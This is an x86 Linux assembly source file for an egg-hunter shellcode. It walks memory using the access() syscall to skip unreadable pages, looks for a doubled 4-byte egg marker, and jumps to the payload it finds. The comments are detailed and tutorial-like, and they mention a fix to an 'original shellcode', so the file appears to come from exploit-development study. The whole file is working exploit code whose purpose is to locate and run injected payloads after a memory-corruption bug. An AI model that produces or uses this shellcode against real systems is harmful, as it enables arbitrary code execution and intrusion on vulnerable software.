global _start
section .text
_start:
	xor ecx, ecx		; ECX = 0 (required to avoid a SEGFAULT that occurs during scasd
				;          in the original shellcode)
	xor edx, edx		; EDX = 0

next_page:
	or dx, 0xfff		; Set EDX to the last address in a page

next_addr:
	inc edx			; EDX += 1 (next address in the page)
	lea ebx, [edx + 0x4]	; const char *pathname = [edx + 0x4]
	push byte +0x21
	pop eax			; EAX = 0x21 = SYS_ACCESS
	int 0x80		; access()

	cmp al, 0xf2		; Checks if return value of access() is 0xfffffff2 (EFAULT)
	jz next_page		; If it is, then keep searching through the pages (address is not accessible)

	mov eax, <EGG>		; Otherwise load the egg into EAX)
	mov edi, edx		; Load the address into EDI
	scasd			; Compared the "string" in EDI to EAX (bytes in memory to egg)
	jnz next_addr		; If the first 4 are not equal, keep searching)
	scasd			; Otherwise check the next 4
	jnz next_addr		; If the second 4 are not equal, keep searching)

	jmp edi			; If the 8 bytes are equal to the egg, then we have most probably
				; found the payload and can jump to it to execute
